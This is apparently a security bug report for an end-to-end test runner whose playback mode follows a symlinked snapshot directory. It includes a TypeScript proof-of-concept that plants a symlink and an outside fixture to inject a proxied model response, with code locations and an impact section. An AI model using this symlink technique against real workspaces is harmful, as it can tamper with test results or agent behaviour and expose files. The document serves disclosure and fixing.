# E2E test runner follows a symlinked snapshot directory and loads external playback responses

## Summary

`@poe-code/e2e-test-runner` playback mode reads response snapshots from the workspace-relative `.snapshots/<testName>` directory without checking whether that directory is a symlink. A crafted workspace can therefore make proxied model calls load response bodies from arbitrary external fixture files.

## Reproduction

1. From the repository root, save this disposable probe as `probe.mts`:

   ```ts
   import { createHash } from "node:crypto";
   import fs from "node:fs/promises";
   import os from "node:os";
   import path from "node:path";
   import { createHostContainer } from "./packages/e2e-test-runner/src/host-container.ts";
   import { setWorkspaceDir } from "./packages/e2e-test-runner/src/runtime.ts";

   const requestBody = {
     model: "test-model",
     messages: [{ role: "user", content: "probe" }]
   };
   const key = `test-model-${createHash("sha256")
     .update(JSON.stringify(requestBody))
     .digest("hex")
     .slice(0, 12)}`;
   const root = await fs.mkdtemp(path.join(os.tmpdir(), "poe-e2e-playback-"));
   const project = path.join(root, "project");
   const outside = path.join(root, "outside");

   await fs.mkdir(path.join(project, ".snapshots"), { recursive: true });
   await fs.mkdir(outside, { recursive: true });
   await fs.symlink(outside, path.join(project, ".snapshots", "case"));
   await fs.writeFile(
     path.join(outside, `${key}.json`),
     JSON.stringify({ key, response: { externallyLoaded: true } }),
     "utf8"
   );

   setWorkspaceDir(project);
   process.env.POE_API_KEY = "fake";
   const container = await createHostContainer(
     { useSnapshots: true, testName: "case" },
     () => ({ bin: "true", args: [] })
   );

   try {
     await container.exec("true");
     const url = (await container.proxyLog())!.match(/http:\/\/[^ ]+/)![0];
     const response = await fetch(`${url}/v1/chat/completions`, {
       method: "POST",
       headers: { "content-type": "application/json" },
       body: JSON.stringify(requestBody)
     });
     console.log(response.status, await response.json());
   } finally {
     await container.destroy();
   }
   ```

2. Execute it with `./node_modules/.bin/tsx ./probe.mts`.

## Observed Behavior

The proxied request returns HTTP `200` with `{ "externallyLoaded": true }`, loaded from the external fixture file reached through the `.snapshots/case` symlink. No snapshot file beneath the real project tree is needed.

`createHostContainer()` passes its derived snapshot directory to the proxy in `packages/e2e-test-runner/src/host-container.ts:285`. Playback derives a deterministic key and calls `readSnapshotResponse()` in `packages/e2e-test-runner/src/proxy-server.ts:262`, which reads `join(route.snapshotDir, `${key}.json`)` directly in `packages/e2e-test-runner/src/proxy-server.ts:141` without validating the real fixture location.

## Expected Behavior

Playback snapshots should be read only from canonical files inside the configured workspace `.snapshots` tree. A symlink escaping that tree should be rejected rather than trusted as recorded response input.

## Impact

A workspace containing a crafted snapshot-directory symlink can inject external response payloads into E2E playback flows. This can manipulate test outcomes or agent behavior and may expose external file contents through the proxy response path when automated tests run against untrusted workspaces.
